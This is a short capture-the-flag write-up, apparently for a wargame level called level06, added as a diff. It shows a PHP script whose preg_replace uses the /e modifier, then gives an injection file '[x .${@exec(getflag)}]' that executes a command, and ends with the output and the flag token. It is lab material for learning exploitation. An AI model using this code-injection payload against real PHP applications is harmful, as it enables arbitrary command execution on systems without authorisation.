@@ -1,0 +1,24 @@
+#we notice a couple of files in the user directory
+#a php script and an executable that runs the script with flag06 permissions
+
+cat level06.php
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+#the script goes through an input file and makes some character replacements
+#it appears to use the 'e' regex modifier in x() along with a wildcard
+#this modifier allows the use of php code within the argument
+#https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php
+
+#by matching the preg_replace pattern [x .*] we can inject our own code to the script
+cat /tmp/inject.txt:
+[x .${@exec(getflag)}]
+
+./level06 /tmp/inject.txt
+HP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+ x
